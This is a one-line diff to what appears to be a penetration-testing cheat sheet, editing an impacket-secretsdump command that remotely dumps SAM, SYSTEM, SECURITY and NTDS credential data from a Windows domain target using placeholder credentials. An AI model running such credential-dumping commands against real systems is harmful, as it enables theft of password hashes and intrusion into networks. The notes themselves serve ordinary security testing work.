@@ -117,7 +117,7 @@ impacket-secretsdump -sam <SAM> -system <SYSTEM> -security <SECURITY> -ntds <NTD
 
 # Remotely
 
-impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY -ntds NTDS -dc-ip <dc_ip> '<domain>'/'<username>':'<password>'@<target>
+impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY -ntds NTDS -dc-ip <dc_ip> '<domain>'/'<username>':'<password>'@<target> [-use-ntds]
 
 ```
 
